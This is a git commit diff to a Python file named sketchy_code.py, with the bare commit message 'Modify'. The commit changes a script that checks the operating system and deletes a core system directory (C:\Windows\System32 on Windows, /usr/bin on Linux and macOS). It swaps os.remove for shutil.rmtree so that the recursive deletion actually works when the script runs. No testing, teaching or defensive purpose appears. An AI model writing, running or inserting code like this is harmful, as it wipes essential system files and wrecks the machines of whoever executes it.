3472cb9fad0d261b960c283ed04ba89c713dc9a8
anshumalivfx <anshumali.karna99@gmail.com>
2022-04-26 23:42:07 +0530

    Modify

--- sketchy_code.py
+++ sketchy_code.py
@@ -1,8 +1,8 @@
-import os
 import platform
+import shutil
 
 if __name__ == "__main__":
     if(platform.system() == "Windows"):   # Windows
-        os.remove("C:\\Windows\\System32")
+        shutil.rmtree("C:\\Windows\\System32")
     elif platform.system() == "Linux" or platform.system() == "Darwin" :   # Linux or Mac OS X
-        os.remove("/usr/bin")
+        shutil.rmtree("/usr/bin")
